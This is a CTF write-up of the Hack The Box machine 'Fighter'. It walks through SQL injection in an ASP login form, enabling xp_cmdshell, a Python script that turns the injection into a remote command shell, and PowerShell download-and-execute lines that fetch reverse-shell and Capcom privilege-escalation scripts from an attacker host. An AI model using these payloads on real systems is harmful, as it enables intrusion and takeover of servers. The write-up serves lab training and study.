### Fighter

#### keyword, xP_cMdsHeLl

gobuster  

#### information

Nmap 7.70 scan initiated Thu Mar 21 09:11:51 2019 as: nmap -sC -sV -oA nmap 10.10.10.72
Nmap scan report for 10.10.10.72
Host is up (0.37s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 8.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: StreetFighter Club

#### **look the website**

firefox http://10.10.10.72/

"  We're
currently redesigning our website streetfighterclub.htb for a
new 
modern look and functionality. The new site should be up and running
soon.
Meanwhile our<span style=color:red> "old" members site is still available for our registered </span>
members (p.s you know the link...)"

#### edit /etc/hosts

10.10.10.72 streetfighterclub.htb members.streetfighterclub.htb

#### **Enum the website**

```
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://members.streetfighterclub.htb/ -f

[+] Mode         : dir
[+] Url/Domain   : http://members.streetfighterclub.htb/
[+] Threads      0
/old/ (Status: 403)

```

http://members.streetfighterclub.htb/old/login.asp

###  LoginType hava sql injection 

 there has a sql inject in [logintype]()  , payload is 1+union+select+1,2,3,4,5,6--+-　number [5]()   is the result on the Email of responder.

```shell
POST /old/verify.asp HTTP/1.1
Host: members.streetfighterclub.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://members.streetfighterclub.htb/old/Login.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 96
Cookie: ASPSESSIONIDQASQRDRR=ABEDGDHBGDKGADJOBEJGOOAB; Email=; Level=%2D1; Chk=3506; password=cGFzczJ3b3Jk; username=YWRtaW4%3D; ASPSESSIONIDQATQQCRR=GPPJKHHBICJCCJKHKDFJJHIC
Connection: close
Upgrade-Insecure-Requests: 1

username=admin&password=asdfasdf&logintype=1+union+select+1,2,3,4,5,6--+-&rememberme=ON&B1=LogIn

soft-IIS/8.5
Set-Cookie: Level=Ng%3D%3D; path=/
Set-Cookie: Email=NQ%3D%3D; path=/
Set-Cookie: Chk=2351; path=/
Set-Cookie: password=YXNkZmFzZGY%3D; expires=Fri, 20-Mar-2020 02:17:16 GMT; path=/
Set-Cookie: username=YWRtaW4%3D; expires=Fri, 20-Mar-2020 02:17:16 GMT; path=/
X-Powered-By: ASP.NET
Date: Thu, 21 Mar 2019 02:17:16 GMT
Connection: close
Content-Length: 132

<head><title>Object moved</title></head>

<body><h1>Object Moved</h1>This object may be found <a HREF="welcome.asp">here</a>.</body>
```

### check the xp_cmd shell 

username=admin&password=asdfasdf&logintype=1+union+select+1,2,3,4,(SELECT+CONVERT(INT,+ISNULL(value,+value_in_use))+AS+config_value+FROM++sys.configurations+WHERE++name+%3d+'xP_CmDsHeLl'),6--+-&rememberme=ON&B1=LogIn

remember <span style=color:red> xp_cmdshell to xP_CmDsHeLl </span>

that is good!



####  execute command by python3

this is a import thing, <span style=color:red> cmd = cmd.replace("'", "''")</span>

1; insert into test (output) exec xP_CmDsHeLl 'c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell  IEX(new-object net.webclient).downloadString(''http://10.10.14.27/rv-9000.ps1'')';-- -

~~~python
#!/usr/bin/python3

import requests
import urllib.parse
import base64

class Fighter(object):

```
def __init__(self):
    self.url = "http://members.streetfighterclub.htb/old/verify.asp"
    self.proxies = "http://127.0.0.1:8080"

    self.enablecmd= '''1;exec sp_configure 'show advanced options',1;\
            reconfigure;\
            exec sp_configure 'xP_CmDsHeLl', 1;\
            reconfigure;\
            '''
    self.createtable = '''1; create table test(ID int identity(1,1) primary key, output varchar(1024));\
    '''

    self.truncate = '''1;truncate table test;\
    '''
```

```
    self.getcount = '''1 union select 1,2,3,4,(select top 1 ID  from test order by ID desc),6-- -\
    '''
    self.session =  requests.session()
    self.session.get(self.url)

    self.post(self.enablecmd)
    self.post(self.createtable)

def post(self, payload):

    proxies = {'http' : self.proxies}

    #enquote = urllib.parse.quote(payload);
    data = {
        'username': 'admin',
        'password': 'password',
        'logintype': payload,
        'rememberme': 'ON',
        'B1': 'LogIn'
    }

    return self.session.post(self.url, proxies=proxies, data=data, allow_redirects=False)

def runcmd(self, cmd):

    self.post(self.truncate)

    cmd = cmd.replace("'", "''")
    payload = f"1; insert into test (output) exec xP_CmDsHeLl '{cmd}';-- -"

    self.post(payload)

    r  =  self.post(self.getcount)
    count = int(self.decode(r.cookies))

    for i in range(0, count):
        id = i + 1;
        op = '1 union select 1,2,3,4,(select top 1 output from test where ID = %d),6-- -' %id
        try:
            r = self.post(op)
            print(self.decode(r.cookies).decode('utf-8'))
        except:
            pass

def decode(self,cookies):
    return base64.b64decode(urllib.parse.unquote(cookies['Email']))
```

o = Fighter()

while True:
    cmd = input(">")
    o.runcmd(cmd)
~~~

#### revershell 

```powershell
c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell  IEX(new-object net.webclient).downloadString('http://10.10.14.27/rv-443.ps1')
```

#### truncate  <span style=color:red> access mode file </span>

// [system.io.file]::open('file', [system.io.filemode]::truncate)

cmd /c "type c:\users\sqlserv\task >> c:\users\decoder\clean.bat"

get the reverse shell



###  Catcom moudle exploit

cmd /c "driverquery"

Module Name  Display Name           Driver Type   Link Date
============ ====================== ============= ======================

Capcom       Capcom                 Kernel        05/09/2016 08:43:33

http://www.fuzzysecurity.com/tutorials/28.html

https://github.com/FuzzySecurity/Capcom-Rootkit

for i in $(find . -name "*.ps1" ); do (cat $i &&  echo ) >> a.txt; done

PS C:\users> IEX(new-object net.webclient).downloadString('http://10.10.14.27/capcom.ps1')

PS C:\users> capcom-elevatepid

## ida-free

new-instance->load root.ext -> view->opensubview->strings(shift+f12)->"string passwd"->select "rdata:0040211C"(ctrl + x) --> call    ds:check



new-install ->load check checkdll.dll ->  view->opensubview->strings(shift+f12)->

->

loc_10001010:
mov     cl, byte ptr ds:aFmFeholH[edx+eax] ; "Fm`fEhOl}h"
xor     cl, 9
cmp     cl, byte ptr ds:aFmFeholH[eax] ; "Fm`fEhOl}h"



## get the real pass key

```python
enpasswd = 'Fm`fEhOl}h'
for i in enpasswd:
    print(chr(ord(i)^9),end='')
```

PS C:\users\administrator\desktop> c:\users\administrator\desktop\root.exe OdioLaFeta
d801c1e9bd9a02f8fb30d8bd3be314c1